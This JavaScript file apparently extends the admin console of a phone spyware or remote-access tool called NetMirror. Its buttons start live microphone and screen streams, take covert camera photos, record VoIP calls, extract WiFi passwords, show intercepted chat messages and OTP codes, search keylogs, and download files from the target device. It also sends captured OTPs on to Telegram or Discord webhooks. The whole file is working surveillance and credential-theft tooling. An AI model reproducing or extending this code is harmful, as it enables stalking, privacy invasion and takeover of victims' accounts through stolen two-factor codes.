/**
 * v79-features.js — NetMirror Admin Panel Extension Module
 *
 * Adds UI controls + data viewers for all v7.9 features:
 *   • Live Mic Stream (start/stop)
 *   • Live Screen Stream (start/stop + grant request)
 *   • Remote Camera Capture (front/back)
 *   • VoIP Call Recording (start/stop)
 *   • WiFi Passwords Extraction
 *   • Geofences management
 *   • App Blocker
 *   • Remote File Manager
 *   • Security Scanner
 *   • Chat Messages viewer (WhatsApp/Telegram/etc)
 *   • OTP Codes viewer
 *   • Two-Way Chat
 *   • Searchable Transcript Vault
 *   • Multi-Device Dashboard
 *   • Webhook configuration (Telegram/Discord)
 *
 * This module is loaded AFTER app.js, so it can reference:
 *   - window.modalDeviceId (current device ID in modal)
 *   - window.adminPassword (auth token)
 *   - window.API_BASE (backend URL)
 *   - window.socket (Socket.IO instance)
 *   - window.showToast(msg, type) (notification helper)
 *   - window.allDevices (cached device list)
 *
 * It injects a new toolbar + tabs into the device modal dynamically.
 */

(function() {
  'use strict';

  const V79_TAG = '[v79]';

  // ═══════════════════════════════════════════════════════════════
  //  HELPERS
  // ═══════════════════════════════════════════════════════════════

  function log(msg) { console.log(`${V79_TAG} ${msg}`); }
  function err(msg) { console.error(`${V79_TAG} ${msg}`); }

  function getDeviceId() {
    return window.modalDeviceId || '';
  }

  function showToast(msg, type) {
    if (window.showToast) window.showToast(msg, type || 'info');
    else alert(msg);
  }

  async function apiCall(endpoint, method, body) {
    const opts = {
      method: method || 'GET',
      headers: {
        'x-admin-password': window.adminPassword || '',
        'Content-Type': 'application/json'
      }
    };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(`${window.API_BASE}${endpoint}`, opts);
    return res.json();
  }

  async function relayCommand(endpoint, extra) {
    const deviceId = getDeviceId();
    if (!deviceId) { showToast('No device selected', 'error'); return null; }
    try {
      const body = { device_id: deviceId, ...extra };
      const data = await apiCall(endpoint, 'POST', body);
      if (data.success) showToast(`✓ Command sent: ${endpoint}`, 'success');
      else showToast(`✗ Failed: ${data.error || 'Unknown error'}`, 'error');
      return data;
    } catch (e) {
      showToast(`✗ Error: ${e.message}`, 'error');
      return null;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  //  INJECT TOOLBAR INTO DEVICE MODAL
  // ═══════════════════════════════════════════════════════════════

  function injectToolbar() {
    // Check if already injected
    if (document.getElementById('v79-toolbar')) return;

    // Find the device modal header area
    const modal = document.getElementById('deviceModal');
    if (!modal) { log('Device modal not found — will retry'); setTimeout(injectToolbar, 2000); return; }

    // Find a good insertion point — after the hideAppBtn or at the top of the modal
    const hideBtn = document.getElementById('hideAppBtn');
    let insertAfter = hideBtn ? hideBtn.parentElement : null;

    if (!insertAfter) {
      // Fallback: find any toolbar in the modal
      insertAfter = modal.querySelector('.device-header, .modal-header, .toolbar');
    }

    const toolbar = document.createElement('div');
    toolbar.id = 'v79-toolbar';
    toolbar.style.cssText = 'display:flex;flex-wrap:wrap;gap:6px;padding:8px;margin:8px 0;background:rgba(0,0,0,.3);border-radius:8px;border:1px solid rgba(255,255,255,.1);';

    toolbar.innerHTML = `
      <button onclick="v79.startMicStream()" style="background:rgba(255,99,71,.2);border:1px solid rgba(255,99,71,.4);color:#ff6347;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🎙️ Live Mic</button>
      <button onclick="v79.stopMicStream()" style="background:rgba(255,99,71,.1);border:1px solid rgba(255,99,71,.2);color:#ff6347;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">⏹ Stop Mic</button>
      <button onclick="v79.requestScreenGrant()" style="background:rgba(70,130,180,.2);border:1px solid rgba(70,130,180,.4);color:#4682b4;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">📺 Screen Grant</button>
      <button onclick="v79.startScreenStream()" style="background:rgba(70,130,180,.2);border:1px solid rgba(70,130,180,.4);color:#4682b4;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">📺 Live Screen</button>
      <button onclick="v79.stopScreenStream()" style="background:rgba(70,130,180,.1);border:1px solid rgba(70,130,180,.2);color:#4682b4;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">⏹ Stop Screen</button>
      <button onclick="v79.captureCamera('back')" style="background:rgba(155,89,182,.2);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">📷 Back Cam</button>
      <button onclick="v79.captureCamera('front')" style="background:rgba(155,89,182,.2);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🤳 Front Cam</button>
      <button onclick="v79.startVoipRecord()" style="background:rgba(241,196,15,.2);border:1px solid rgba(241,196,15,.4);color:#f1c40f;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">📞 VoIP Record</button>
      <button onclick="v79.stopVoipRecord()" style="background:rgba(241,196,15,.1);border:1px solid rgba(241,196,15,.2);color:#f1c40f;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">⏹ Stop VoIP</button>
      <button onclick="v79.extractWifiPasswords()" style="background:rgba(52,152,219,.2);border:1px solid rgba(52,152,219,.4);color:#3498db;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">📶 WiFi PW</button>
      <button onclick="v79.runSecurityScan()" style="background:rgba(231,76,60,.2);border:1px solid rgba(231,76,60,.4);color:#e74c3c;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🔒 Security Scan</button>
      <button onclick="v79.openFileManager()" style="background:rgba(149,165,166,.2);border:1px solid rgba(149,165,166,.4);color:#95a5a6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">📁 Files</button>
      <button onclick="v79.openChatMessages()" style="background:rgba(39,174,96,.2);border:1px solid rgba(39,174,96,.4);color:#27ae60;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">💬 Chats</button>
      <button onclick="v79.openOtpCodes()" style="background:rgba(211,84,0,.2);border:1px solid rgba(211,84,0,.4);color:#d35400;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🔑 OTPs</button>
      <button onclick="v79.openGeofences()" style="background:rgba(41,128,185,.2);border:1px solid rgba(41,128,185,.4);color:#2980b9;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🗺️ Geofences</button>
      <button onclick="v79.openAppBlocker()" style="background:rgba(192,57,43,.2);border:1px solid rgba(192,57,43,.4);color:#c0392b;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🚫 App Block</button>
      <button onclick="v79.openTwoWayChat()" style="background:rgba(155,89,182,.2);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">✉️ Chat</button>
      <button onclick="v79.openSearch()" style="background:rgba(243,156,18,.2);border:1px solid rgba(243,156,18,.4);color:#f39c12;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;">🔍 Search</button>
    `;

    if (insertAfter && insertAfter.parentNode) {
      insertAfter.parentNode.insertBefore(toolbar, insertAfter.nextSibling);
    } else {
      // Last resort: prepend to modal body
      const modalBody = modal.querySelector('.modal-body, .device-modal-body, .modal-content') || modal;
      modalBody.insertBefore(toolbar, modalBody.firstChild);
    }

    log('Toolbar injected into device modal');
  }

  // ═══════════════════════════════════════════════════════════════
  //  LIVE MIC / SCREEN / CAMERA / VOIP CONTROLS
  // ═══════════════════════════════════════════════════════════════

  window.v79 = {
    startMicStream: () => relayCommand('/api/admin/start-mic-stream'),
    stopMicStream: () => relayCommand('/api/admin/stop-mic-stream'),
    requestScreenGrant: () => relayCommand('/api/admin/request-screen-grant'),
    startScreenStream: () => relayCommand('/api/admin/start-screen-stream'),
    stopScreenStream: () => relayCommand('/api/admin/stop-screen-stream'),
    captureCamera: (camera) => relayCommand('/api/admin/capture-camera', { camera, quality: 'high' }),
    startVoipRecord: () => relayCommand('/api/admin/start-voip-record'),
    stopVoipRecord: () => relayCommand('/api/admin/stop-voip-record'),
    extractWifiPasswords: () => relayCommand('/api/admin/extract-wifi-passwords'),
    runSecurityScan: () => relayCommand('/api/admin/run-security-scan'),

    // ═══ FILE MANAGER ═══
    openFileManager: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('No device selected', 'error'); return; }
      const path = prompt('Enter path to list:', '/sdcard');
      if (!path) return;
      try {
        const data = await apiCall('/api/admin/list-files', 'POST', { device_id: deviceId, path });
        if (data.success) {
          showToast(`Listed ${data.entries?.length || 0} entries in ${path}`, 'success');
          // The result comes via socket 'files_listed' event — show in a modal
          showFileManagerModal(path, []);
        } else {
          showToast(`Failed: ${data.error}`, 'error');
        }
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ CHAT MESSAGES VIEWER ═══
    openChatMessages: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/chat-messages?limit=200`);
        showChatMessagesModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ OTP CODES VIEWER ═══
    openOtpCodes: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/otp-codes?limit=100`);
        showOtpCodesModal(data.entries || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ GEOFENCES ═══
    openGeofences: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/geofences`);
        const events = await apiCall(`/api/devices/${deviceId}/geofence-events?limit=50`);
        showGeofencesModal(data.geofences || [], events.events || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ APP BLOCKER ═══
    openAppBlocker: function() {
      const pkg = prompt('Enter package name to block:', 'com.example.app');
      if (!pkg) return;
      const action = confirm(`Block "${pkg}"?\n\nOK = Block\nCancel = Unblock`) ? 'block' : 'unblock';
      const endpoint = action === 'block' ? '/api/admin/block-app' : '/api/admin/unblock-app';
      relayCommand(endpoint, { package: pkg });
    },

    // ═══ TWO-WAY CHAT ═══
    openTwoWayChat: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('No device selected', 'error'); return; }
      try {
        const data = await apiCall(`/api/devices/${deviceId}/chat?limit=50`);
        showTwoWayChatModal(data.messages || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ SEARCH VAULT ═══
    openSearch: async function() {
      const deviceId = getDeviceId();
      if (!deviceId) { showToast('No device selected', 'error'); return; }
      const q = prompt('Search across all captured data (chats, OTPs, keylogs, notifications):', '');
      if (!q) return;
      try {
        const data = await apiCall(`/api/devices/${deviceId}/search?q=${encodeURIComponent(q)}&limit=50`);
        showSearchResultsModal(q, data.results || []);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ WEBHOOK CONFIG ═══
    openWebhooks: async function() {
      try {
        const data = await apiCall('/api/admin/webhooks');
        const current = data.webhook;
        const url = prompt('Webhook URL (Telegram/Discord):', current?.url || '');
        if (url === null) return;
        const events = prompt('Events (comma-separated):', (current?.events || ['otp_captured','geofence_event','security_event']).join(','));
        if (events === null) return;
        await apiCall('/api/admin/webhooks', 'POST', {
          url, events: events.split(',').map(e => e.trim()).filter(Boolean), enabled: true
        });
        showToast('Webhook saved!', 'success');
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    },

    // ═══ DASHBOARD ═══
    openDashboard: async function() {
      try {
        const data = await apiCall('/api/admin/dashboard');
        showDashboardModal(data);
      } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
    }
  };

  // ═══════════════════════════════════════════════════════════════
  //  MODAL DISPLAY FUNCTIONS
  // ═══════════════════════════════════════════════════════════════

  function createModal(title, contentHtml) {
    const overlay = document.createElement('div');
    overlay.id = 'v79-modal-overlay';
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.8);z-index:100000;display:flex;align-items:center;justify-content:center;padding:20px;';
    overlay.innerHTML = `
      <div style="background:#1a1a2e;color:#fff;border-radius:12px;max-width:90vw;max-height:85vh;width:800px;display:flex;flex-direction:column;overflow:hidden;border:1px solid rgba(255,255,255,.15);">
        <div style="display:flex;justify-content:space-between;align-items:center;padding:16px 20px;border-bottom:1px solid rgba(255,255,255,.1);">
          <h3 style="margin:0;font-size:16px;color:#fff;">${title}</h3>
          <button onclick="this.closest('#v79-modal-overlay').remove()" style="background:none;border:none;color:#fff;font-size:24px;cursor:pointer;">&times;</button>
        </div>
        <div style="padding:20px;overflow-y:auto;flex:1;">${contentHtml}</div>
      </div>
    `;
    document.body.appendChild(overlay);
    return overlay;
  }

  function showChatMessagesModal(entries) {
    const rows = entries.map(e => `
      <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
        <td style="padding:8px;color:#3498db;">${e.app || ''}</td>
        <td style="padding:8px;">${e.conversation || ''}</td>
        <td style="padding:8px;color:#e74c3c;">${e.sender || ''}</td>
        <td style="padding:8px;">${e.message_text || ''}</td>
        <td style="padding:8px;color:#95a5a6;font-size:11px;">${e.recorded_at || ''}</td>
      </tr>
    `).join('');
    createModal(`💬 Chat Messages (${entries.length})`, `
      <table style="width:100%;border-collapse:collapse;font-size:13px;">
        <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
          <th style="padding:8px;">App</th><th style="padding:8px;">Conversation</th>
          <th style="padding:8px;">Sender</th><th style="padding:8px;">Message</th>
          <th style="padding:8px;">Time</th>
        </tr></thead>
        <tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No chat messages captured yet</td></tr>'}</tbody>
      </table>
    `);
  }

  function showOtpCodesModal(entries) {
    const rows = entries.map(e => `
      <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
        <td style="padding:8px;color:#d35400;font-size:18px;font-weight:bold;">${e.code || ''}</td>
        <td style="padding:8px;">${e.app || ''}</td>
        <td style="padding:8px;">${e.sender || ''}</td>
        <td style="padding:8px;font-size:11px;color:#95a5a6;">${e.full_text || ''}</td>
        <td style="padding:8px;color:#95a5a6;font-size:11px;">${e.captured_at || ''}</td>
      </tr>
    `).join('');
    createModal(`🔑 OTP Codes (${entries.length})`, `
      <table style="width:100%;border-collapse:collapse;font-size:13px;">
        <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
          <th style="padding:8px;">Code</th><th style="padding:8px;">App</th>
          <th style="padding:8px;">Sender</th><th style="padding:8px;">Full Text</th>
          <th style="padding:8px;">Captured</th>
        </tr></thead>
        <tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No OTP codes captured yet</td></tr>'}</tbody>
      </table>
    `);
  }

  function showGeofencesModal(geofences, events) {
    const gfRows = geofences.map(g => `
      <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
        <td style="padding:8px;">${g.name || ''}</td>
        <td style="padding:8px;font-size:11px;color:#95a5a6;">${g.points || ''}</td>
        <td style="padding:8px;">${g.alert_on_enter ? '✅' : '❌'} / ${g.alert_on_exit ? '✅' : '❌'}</td>
      </tr>
    `).join('');
    const evRows = events.map(e => `
      <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
        <td style="padding:8px;color:${e.event === 'enter' ? '#27ae60' : '#e74c3c'};">${e.event || ''}</td>
        <td style="padding:8px;">${e.geofence_name || ''}</td>
        <td style="padding:8px;font-size:11px;">${e.latitude || 0}, ${e.longitude || 0}</td>
        <td style="padding:8px;color:#95a5a6;font-size:11px;">${e.recorded_at || ''}</td>
      </tr>
    `).join('');
    createModal(`🗺️ Geofences`, `
      <h4 style="color:#2980b9;margin:0 0 10px;">Active Geofences (${geofences.length})</h4>
      <table style="width:100%;border-collapse:collapse;font-size:13px;margin-bottom:20px;">
        <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
          <th style="padding:8px;">Name</th><th style="padding:8px;">Points</th>
          <th style="padding:8px;">Enter/Exit Alerts</th>
        </tr></thead>
        <tbody>${gfRows || '<tr><td colspan="3" style="padding:20px;text-align:center;color:#666;">No geofences set</td></tr>'}</tbody>
      </table>
      <h4 style="color:#2980b9;margin:0 0 10px;">Recent Events (${events.length})</h4>
      <table style="width:100%;border-collapse:collapse;font-size:13px;">
        <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
          <th style="padding:8px;">Event</th><th style="padding:8px;">Geofence</th>
          <th style="padding:8px;">Location</th><th style="padding:8px;">Time</th>
        </tr></thead>
        <tbody>${evRows || '<tr><td colspan="4" style="padding:20px;text-align:center;color:#666;">No geofence events</td></tr>'}</tbody>
      </table>
    `);
  }

  function showSearchResultsModal(query, results) {
    const rows = results.map(r => `
      <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
        <td style="padding:8px;color:#f39c12;">${r.source || ''}</td>
        <td style="padding:8px;color:#3498db;">${r.context || ''}</td>
        <td style="padding:8px;">${r.sender || ''}</td>
        <td style="padding:8px;">${r.text || ''}</td>
        <td style="padding:8px;color:#95a5a6;font-size:11px;">${r.recorded_at || ''}</td>
      </tr>
    `).join('');
    createModal(`🔍 Search: "${query}" (${results.length} results)`, `
      <table style="width:100%;border-collapse:collapse;font-size:13px;">
        <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
          <th style="padding:8px;">Source</th><th style="padding:8px;">Context</th>
          <th style="padding:8px;">Sender</th><th style="padding:8px;">Text</th>
          <th style="padding:8px;">Time</th>
        </tr></thead>
        <tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No results found</td></tr>'}</tbody>
      </table>
    `);
  }

  function showTwoWayChatModal(messages) {
    const msgs = messages.map(m => `
      <div style="margin:8px 0;padding:10px;border-radius:8px;${m.from_sender === 'admin' ? 'background:rgba(52,152,219,.15);margin-left:40px;' : 'background:rgba(149,165,166,.1);margin-right:40px;'}">
        <div style="font-size:11px;color:#95a5a6;margin-bottom:4px;">${m.from_sender} · ${m.ts}</div>
        <div>${m.message}</div>
      </div>
    `).join('');
    createModal('✉️ Two-Way Chat', `
      <div style="margin-bottom:16px;">
        <input id="v79-chat-input" type="text" placeholder="Type a message or command..." style="width:75%;padding:8px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;">
        <button onclick="v79.sendChatMessage()" style="width:22%;padding:8px;background:rgba(155,89,182,.3);border:1px solid rgba(155,89,182,.5);color:#fff;border-radius:6px;cursor:pointer;">Send</button>
      </div>
      <div style="max-height:400px;overflow-y:auto;">${msgs || '<div style="padding:20px;text-align:center;color:#666;">No messages yet</div>'}</div>
    `);
  }

  window.v79.sendChatMessage = async function() {
    const input = document.getElementById('v79-chat-input');
    if (!input || !input.value.trim()) return;
    const deviceId = getDeviceId();
    if (!deviceId) return;
    try {
      await apiCall(`/api/devices/${deviceId}/chat`, 'POST', { message: input.value, type: 'command' });
      input.value = '';
      showToast('Message sent!', 'success');
    } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
  };

  function showFileManagerModal(path, entries) {
    createModal(`📁 File Manager: ${path}`, `
      <div id="v79-file-list" style="font-family:monospace;font-size:12px;">
        <div style="padding:20px;text-align:center;color:#95a5a6;">
          File listing will arrive via socket event "files_listed".<br>
          Check the console for real-time results.
        </div>
      </div>
    `);
  }

  function showDashboardModal(data) {
    const deviceRows = (data.devices || []).slice(0, 20).map(d => `
      <tr style="border-bottom:1px solid rgba(255,255,255,.05);cursor:pointer;" onclick="document.getElementById('v79-modal-overlay').remove(); window.openDeviceModal && openDeviceModal('${d.device_id}');">
        <td style="padding:8px;color:${d.online ? '#27ae60' : '#666'};">${d.online ? '●' : '○'}</td>
        <td style="padding:8px;">${d.device_name || d.model || d.device_id.substring(0, 8)}</td>
        <td style="padding:8px;">${d.app_version || '?'}</td>
        <td style="padding:8px;color:#95a5a6;">${d.last_seen_minutes_ago != null ? d.last_seen_minutes_ago + ' min ago' : 'never'}</td>
      </tr>
    `).join('');
    createModal(`📊 Dashboard (${data.online || 0} online / ${data.total || 0} total)`, `
      <table style="width:100%;border-collapse:collapse;font-size:13px;">
        <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
          <th style="padding:8px;">Status</th><th style="padding:8px;">Device</th>
          <th style="padding:8px;">Version</th><th style="padding:8px;">Last Seen</th>
        </tr></thead>
        <tbody>${deviceRows}</tbody>
      </table>
      ${data.total > 20 ? `<div style="padding:10px;text-align:center;color:#95a5a6;">Showing 20 of ${data.total} devices</div>` : ''}
    `);
  }

  // ═══════════════════════════════════════════════════════════════
  //  SOCKET LISTENERS — real-time updates
  // ═══════════════════════════════════════════════════════════════

  function registerSocketListeners() {
    if (!window.socket) {
      log('Socket not ready — will retry');
      setTimeout(registerSocketListeners, 3000);
      return;
    }

    const socket = window.socket;

    socket.on('otp_captured', (data) => {
      showToast(`🔑 OTP captured: ${data.code} (${data.sender})`, 'success');
      log(`OTP: ${data.code} from ${data.app}`);
    });

    socket.on('chat_message', (data) => {
      log(`Chat: ${data.sender}: ${data.text?.substring(0, 50)}`);
    });

    socket.on('geofence_event', (data) => {
      showToast(`🗺️ Geofence ${data.event}: ${data.geofence_name}`, data.event === 'enter' ? 'success' : 'error');
    });

    socket.on('security_event', (data) => {
      if (data.compromised) {
        showToast(`🚨 SECURITY THREAT on ${data.device_id}!`, 'error');
      }
      log(`Security scan: ${data.finding_count} findings, compromised=${data.compromised}`);
    });

    socket.on('camera_capture_result', (data) => {
      if (data.success) {
        showToast(`📷 Photo captured: ${data.camera}`, 'success');
        // Open the photo in a new tab
        if (data.url) window.open(data.url, '_blank');
      } else {
        showToast(`📷 Camera failed: ${data.error}`, 'error');
      }
    });

    socket.on('wifi_passwords_result', (data) => {
      const count = data.count || 0;
      showToast(`📶 WiFi passwords extracted: ${count} networks`, 'success');
      // Show in a modal
      const rows = (data.networks || []).map(n => `
        <tr style="border-bottom:1px solid rgba(255,255,255,.05);">
          <td style="padding:8px;">${n.ssid || ''}</td>
          <td style="padding:8px;color:#27ae60;font-family:monospace;">${n.password || '(redacted)'}</td>
          <td style="padding:8px;">${n.security || ''}</td>
        </tr>
      `).join('');
      createModal(`📶 WiFi Networks (${count})`, `
        <p style="color:#95a5a6;font-size:12px;">Has root: ${data.has_root ? 'Yes' : 'No (passwords may be redacted on Android 10+)'}</p>
        <table style="width:100%;border-collapse:collapse;font-size:13px;">
          <thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);">
            <th style="padding:8px;">SSID</th><th style="padding:8px;">Password</th><th style="padding:8px;">Security</th>
          </tr></thead>
          <tbody>${rows || '<tr><td colspan="3" style="padding:20px;text-align:center;color:#666;">No networks found</td></tr>'}</tbody>
        </table>
      `);
    });

    socket.on('mic_stream_started', (data) => {
      if (data.success) showToast('🎙️ Mic streaming started', 'success');
      else showToast(`🎙️ Mic failed: ${data.error}`, 'error');
    });

    socket.on('screen_stream_started', (data) => {
      if (data.success) showToast('📺 Screen streaming started', 'success');
      else showToast(`📺 Screen failed: ${data.error}`, 'error');
    });

    socket.on('voip_record_started', (data) => {
      if (data.success) showToast('📞 VoIP recording started', 'success');
      else showToast(`📞 VoIP failed: ${data.error}`, 'error');
    });

    socket.on('voip_record_result', (data) => {
      if (data.success) {
        showToast('📞 VoIP recording uploaded!', 'success');
        if (data.url) window.open(data.url, '_blank');
      }
    });

    socket.on('files_listed', (data) => {
      const entries = data.entries || [];
      showToast(`📁 Listed ${entries.length} files in ${data.path}`, 'success');
      // Update file manager modal if open
      const list = document.getElementById('v79-file-list');
      if (list) {
        list.innerHTML = entries.map(e => `
          <div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);${e.is_dir ? 'color:#3498db;cursor:pointer;' : 'color:#fff;'}" ${e.is_dir ? `onclick="v79.browseTo('${e.path}')"` : ''}>
            ${e.is_dir ? '📁' : '📄'} ${e.name} ${e.is_dir ? '' : `<span style="color:#666;font-size:11px;">(${(e.size/1024).toFixed(1)} KB)</span>`}
            ${!e.is_dir ? `<button onclick="v79.downloadFile('${e.path}')" style="float:right;background:rgba(52,152,219,.3);border:none;color:#fff;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px;">Download</button>` : ''}
          </div>
        `).join('') || '<div style="padding:20px;text-align:center;color:#666;">Empty directory</div>';
      }
    });

    socket.on('file_download_result', (data) => {
      if (data.success) {
        showToast(`📁 File uploaded: ${data.path}`, 'success');
        if (data.url) window.open(data.url, '_blank');
      } else {
        showToast(`📁 Download failed: ${data.error}`, 'error');
      }
    });

    log('Socket listeners registered');
  }

  window.v79.browseTo = function(path) {
    const deviceId = getDeviceId();
    if (!deviceId) return;
    apiCall('/api/admin/list-files', 'POST', { device_id: deviceId, path }).then(() => {
      // Result comes via socket 'files_listed'
    });
  };

  window.v79.downloadFile = function(path) {
    const deviceId = getDeviceId();
    if (!deviceId) return;
    apiCall('/api/admin/download-file', 'POST', { device_id: deviceId, path }).then(() => {
      showToast('📁 File download requested...', 'info');
      // Result comes via socket 'file_download_result'
    });
  };

  // ═══════════════════════════════════════════════════════════════
  //  INJECT GLOBAL BUTTONS (Dashboard + Webhooks)
  // ═══════════════════════════════════════════════════════════════

  function injectGlobalButtons() {
    if (document.getElementById('v79-dashboard-btn')) return;

    // Find the header/navbar area
    const header = document.querySelector('header, .navbar, .header, .top-bar, .sidebar');
    if (!header) {
      setTimeout(injectGlobalButtons, 3000);
      return;
    }

    const btnContainer = document.createElement('div');
    btnContainer.style.cssText = 'display:inline-flex;gap:6px;margin-left:12px;';
    btnContainer.innerHTML = `
      <button id="v79-dashboard-btn" onclick="v79.openDashboard()" style="background:rgba(46,204,113,.2);border:1px solid rgba(46,204,113,.4);color:#2ecc71;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;">📊 Dashboard</button>
      <button id="v79-webhook-btn" onclick="v79.openWebhooks()" style="background:rgba(155,89,182,.2);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:12px;">🔔 Webhooks</button>
    `;
    header.appendChild(btnContainer);
    log('Global buttons injected');
  }

  // ═══════════════════════════════════════════════════════════════
  //  INIT — run when DOM is ready
  // ═══════════════════════════════════════════════════════════════

  function init() {
    log('v7.9 Features module loaded');
    injectGlobalButtons();

    // Watch for device modal opening — inject toolbar when it opens
    const observer = new MutationObserver(() => {
      const modal = document.getElementById('deviceModal');
      if (modal && !modal.classList.contains('hidden') && !document.getElementById('v79-toolbar')) {
        injectToolbar();
      }
    });
    observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] });

    // Register socket listeners (with retry for late socket init)
    registerSocketListeners();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
